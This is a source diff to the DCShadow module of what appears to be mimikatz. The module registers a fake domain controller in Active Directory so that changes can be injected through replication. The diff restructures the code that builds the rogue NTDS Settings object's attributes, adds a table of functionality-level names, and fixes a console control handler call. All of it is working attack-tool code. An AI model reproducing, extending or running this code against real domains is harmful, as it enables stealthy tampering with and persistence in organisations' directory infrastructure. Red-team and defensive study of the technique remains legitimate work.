@@ -1128,6 +1128,7 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainN
 	return status;
 }
 
+const PCWSTR SZ_DOMAIN_CONTROLLER_FUNCTIONALITY[] = {L"WIN2000", L"WIN2003 interim", L"WIN2003", L"WIN2008", L"WIN2008R2", L"WIN2012", L"WIN2012R2", L"WIN2016"};
 BOOL kuhl_m_lsadump_dcshadow_domaininfo_rootDse(PLDAP ld, PDCSHADOW_DOMAIN_INFO info)
 {
 	DWORD dwErr;
@@ -1162,7 +1163,7 @@ BOOL kuhl_m_lsadump_dcshadow_domaininfo_rootDse(PLDAP ld, PDCSHADOW_DOMAIN_INFO 
 				info->dwDomainControllerFunctionality = wcstoul(tmp, NULL, 10);
 				LocalFree(tmp);
 			}
-			kprintf(L"domainControllerFunctionality: %u\n", info->dwDomainControllerFunctionality);
+			kprintf(L"domainControllerFunctionality: %u ( %s )\n", info->dwDomainControllerFunctionality, (info->dwDomainControllerFunctionality < ARRAYSIZE(SZ_DOMAIN_CONTROLLER_FUNCTIONALITY) ? SZ_DOMAIN_CONTROLLER_FUNCTIONALITY[info->dwDomainControllerFunctionality] : L"?"));
 			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[5]))
 			{
 				info->maxDCUsn = wcstoul(tmp, NULL, 10);
@@ -1816,89 +1817,48 @@ ULONG kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry(PDCSHADOW_DOMAIN_INFO dif,
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	DWORD i;
-	DCSHADOW_PUSH_REQUEST_OBJECT object = {0};
-	DCSHADOW_OBJECT_ATTRIBUTE attributes[10] = {0};
-	DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE values[10] = {0};
-	WCHAR szFunctionalLevel[] = L"0";
+	wchar_t szFunctionalLevel[] = L"0";
 	PWSTR pszFunctionalLevel = (PWSTR) &szFunctionalLevel;
 	GUID InvocationId;
-	WCHAR szInvocationId[2*sizeof(GUID)+1];
+	wchar_t szInvocationId[2*sizeof(GUID)+1];
 	PWSTR pszInvocationId = (PWSTR) &szInvocationId;
 	PWSTR pszHasMasterNC[] = {dif->szDomainNamingContext, dif->szConfigurationNamingContext, dif->szSchemaNamingContext};
 	PWSTR szObjectClassOid = TEXT(szOID_ANSI_nTDSDSA);
 	PWSTR szSystemFlags = L"16";
 	PWSTR szOption = L"0";
-
 	
+	DCSHADOW_OBJECT_ATTRIBUTE attributes[] = {
+		{NULL, szOID_objectclass,			SYNTAX_OID,				FALSE}, // 0
+		{NULL, szOID_hasMasterNCs,			SYNTAX_DN,				FALSE}, // 1
+		{NULL, szOID_dMDLocation,			SYNTAX_DN,				FALSE}, // 2
+		{NULL, szOID_invocationId,			SYNTAX_OCTET_STRING,	FALSE}, // 3
+		{NULL, szOID_options,				SYNTAX_INTEGER,			FALSE}, // 4
+		{NULL, szOID_systemFlags,			SYNTAX_INTEGER,			FALSE}, // 5
+		{NULL, szOID_serverReference,		SYNTAX_DN,				FALSE}, // 6
+		{NULL, szOID_msDS_Behavior_Version,	SYNTAX_INTEGER,			FALSE}, // 7
+		{NULL, szOID_msDS_HasDomainNCs,		SYNTAX_DN,				FALSE}, // 8
+		{NULL, szOID_msDS_hasMasterNCs,		SYNTAX_DN,				FALSE} // 9
+	};
+	DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE values[ARRAYSIZE(attributes)] = {
+		{attributes + 0, {0}, {1, NULL}, &szObjectClassOid}, // 0
+		{attributes + 1, {0}, {3, NULL}, pszHasMasterNC}, // 1
+		{attributes + 2, {0}, {1, NULL}, &dif->szSchemaNamingContext}, // 2
+		{attributes + 3, {0}, {1, NULL}, &pszInvocationId}, // 3
+		{attributes + 4, {0}, {1, NULL}, &szOption}, // 4
+		{attributes + 5, {0}, {1, NULL}, &szSystemFlags}, // 5
+		{attributes + 6, {0}, {1, NULL}, &dif->szFakeDN}, // 6
+		{attributes + 7, {0}, {1, NULL}, &pszFunctionalLevel}, // 7
+		{attributes + 8, {0}, {1, NULL}, &dif->szDomainNamingContext}, // 8
+		{attributes + 9, {0}, {3, NULL}, pszHasMasterNC}, // 9
+	};
+	DCSHADOW_PUSH_REQUEST_OBJECT object = {TRUE, NULL, {0}, {0}, ARRAYSIZE(values), values};
+
+	szFunctionalLevel[0] += (WCHAR) dif->dwDomainControllerFunctionality;
 	UuidCreate(&InvocationId);
+
 	for(i = 0; i < sizeof(GUID); i++)
 		swprintf_s(szInvocationId + 2*i, 2*sizeof(GUID) +1 - 2 *i, L"%02X", ((PBYTE) &InvocationId)[i]);
 
-	object.cbAttributes = ARRAYSIZE(values);
-	object.pAttributes = values;
-	object.fAdd = TRUE;
-	
-	values[0].pAttribute = attributes + 0;
-	values[0].pszValue = &szObjectClassOid;
-	values[0].AttrVal.valCount = 1;
-	attributes[0].Oid = szOID_objectclass;
-	attributes[0].dwSyntax = SYNTAX_OID;
-	
-	values[1].pAttribute = attributes + 1;
-	values[1].pszValue = pszHasMasterNC;
-	values[1].AttrVal.valCount = 3;
-	attributes[1].Oid = szOID_hasMasterNCs;
-	attributes[1].dwSyntax = SYNTAX_DN;
-	
-	values[2].pAttribute = attributes + 2;
-	values[2].pszValue = &(dif->szSchemaNamingContext);
-	values[2].AttrVal.valCount = 1;
-	attributes[2].Oid = szOID_dMDLocation;
-	attributes[2].dwSyntax = SYNTAX_DN;
-	
-	values[3].pAttribute = attributes + 3;
-	values[3].pszValue = &pszInvocationId;
-	values[3].AttrVal.valCount = 1;
-	attributes[3].Oid = szOID_invocationId;
-	attributes[3].dwSyntax = SYNTAX_OCTET_STRING;
-	
-	values[4].pAttribute = attributes + 4;
-	values[4].pszValue = &szOption;
-	values[4].AttrVal.valCount = 1;
-	attributes[4].Oid = szOID_options;
-	attributes[4].dwSyntax = SYNTAX_INTEGER;
-	
-	values[5].pAttribute = attributes + 5;
-	values[5].pszValue = &szSystemFlags;
-	values[5].AttrVal.valCount = 1;
-	attributes[5].Oid = szOID_systemFlags;
-	attributes[5].dwSyntax = SYNTAX_INTEGER;
-	
-	values[6].pAttribute = attributes + 6;
-	values[6].pszValue = &(dif->szFakeDN);
-	values[6].AttrVal.valCount = 1;
-	attributes[6].Oid = szOID_serverReference;
-	attributes[6].dwSyntax = SYNTAX_DN;
-	
-	values[7].pAttribute = attributes + 7;
-	szFunctionalLevel[0] += (WCHAR) dif->dwDomainControllerFunctionality;
-	values[7].pszValue = &pszFunctionalLevel;
-	values[7].AttrVal.valCount = 1;
-	attributes[7].Oid = szOID_msDS_Behavior_Version;
-	attributes[7].dwSyntax = SYNTAX_INTEGER;
-	
-	values[8].pAttribute = attributes + 8;
-	values[8].pszValue = &(dif->szDomainNamingContext);
-	values[8].AttrVal.valCount = 1;
-	attributes[8].Oid = szOID_msDS_HasDomainNCs;
-	attributes[8].dwSyntax = SYNTAX_DN;
-	
-	values[9].pAttribute = attributes + 9;
-	values[9].pszValue = pszHasMasterNC;
-	values[9].AttrVal.valCount = 3;
-	attributes[9].Oid = szOID_msDS_hasMasterNCs;
-	attributes[9].dwSyntax = SYNTAX_DN;
-	
 	if(kull_m_string_sprintf(&object.szObjectDN, L"CN=NTDS Settings,CN=%s%s", dif->szFakeDCNetBIOS, dif->szDsServiceName))
 	{
 		for(i = 0; i < object.cbAttributes; i++)
@@ -2336,7 +2296,7 @@ NTSTATUS kuhl_m_lsadump_dcshadow(int argc, wchar_t * argv[])
 							kprintf(L"== Press Control+C to stop ==\n");
 							SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, TRUE);
 							WaitForSingleObject(pDCShadowDomainInfoInUse->hGetNCChangeCalled, INFINITE);
-							SetConsoleCtrlHandler(NULL, FALSE);
+							SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, FALSE);
 							// wait for the RPC call to complete and the Drs Bind to be close by the DC
 							Sleep(500);
 						}
